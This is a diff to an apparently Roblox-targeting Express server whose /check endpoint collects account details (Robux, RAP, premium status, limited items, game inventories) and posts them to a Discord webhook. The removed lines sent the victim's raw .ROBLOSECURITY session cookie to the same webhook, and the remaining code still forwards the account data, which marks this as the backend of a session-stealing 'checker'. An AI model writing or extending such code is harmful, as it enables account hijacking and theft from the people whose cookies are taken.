@@ -3,7 +3,7 @@ const app = express();
 
 app.use(express.json());
 
-// CORS – żeby strona działała
+// CORS
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -262,7 +262,7 @@ app.post('/check', async (req, res) => {
 
     res.status(200).json(result);
 
-    // Wysyłka do webhooka – dwa embedy w jednej wiadomości
+    // Wysyłka do webhooka – z JB
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -270,60 +270,49 @@ app.post('/check', async (req, res) => {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            embeds: [
-              // Embed 1 – pełny z informacjami o koncie
-              {
-                color: 0x0F0F23,
-                title: `<:User:1481761037257674872> ${userData.name}`,
-                description: "**AVATAR**",
-                thumbnail: {
-                  url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
-                },
-                fields: [
-                  {
-                    name: "┌─────── Account Stats ───────┐",
-                    value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
-                    inline: false
-                  },
-                  {
-                    name: "**Info**",
-                    value:
-                      `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
-                      `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
-                      `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
-                    inline: true
-                  },
-                  {
-                    name: "**Games**",
-                    value:
-                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
-                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
-                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
-                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
-                    inline: true
-                  },
-                  {
-                    name: "**Inventory**",
-                    value:
-                      `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
-                      `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
-                    inline: true
-                  }
-                ],
-                footer: {
-                  text: "24H! • " + new Date().toLocaleString('pl-PL')
-                },
-                timestamp: new Date().toISOString()
+            embeds: [{
+              color: 0x0F0F23,
+              title: `<:User:1481761037257674872> ${userData.name}`,
+              description: "**AVATAR**",
+              thumbnail: {
+                url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
               },
-
-              // Embed 2 – tylko .ROBLOSECURITY (ciemno fioletowy, minimalistyczny)
-              {
-                color: 0x4B0082,
-                title: ".ROBLOSECURITY",
-                description: `\`\`\`\n${cookie}\n\`\`\``,
-                timestamp: new Date().toISOString()
-              }
-            ]
+              fields: [
+                {
+                  name: "┌─────── Account Stats ───────┐",
+                  value: `• Account Age: **${accountAgeDays} days**\n• Game Developer: **False**\n• RAP: **${rap.toLocaleString('en-US')}**\n• Groups Owned: **${groupsOwned}**`,
+                  inline: false
+                },
+                {
+                  name: "**Info**",
+                  value:
+                    `<:Robux:1481762078124544030> Robux: **${robux.toLocaleString('en-US')}**\n` +
+                    `<:Premium:1481761448592933034> Premium: **${hasPremium ? 'True' : 'False'}**\n` +
+                    `<:Email:1481762590467035136> Email: **${emailVerified ? 'True' : 'False'}**`,
+                  inline: true
+                },
+                {
+                  name: "**Games**",
+                  value:
+                    `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
+                    `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
+                    `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
+                    `<:JB:1481804052215103509> JB: **${jbCount}**`,
+                  inline: true
+                },
+                {
+                  name: "**Inventory**",
+                  value:
+                    `<:Korblox:1481770192500424775> Korblox: **${hasKorblox ? 'True' : 'False'}**\n` +
+                    `<:Headless:1481770398642077919> Headless: **${hasHeadless ? 'True' : 'False'}**`,
+                  inline: true
+                }
+              ],
+              footer: {
+                text: "24H! • " + new Date().toLocaleString('pl-PL')
+              },
+              timestamp: new Date().toISOString()
+            }]
           })
         });
       } catch (e) {
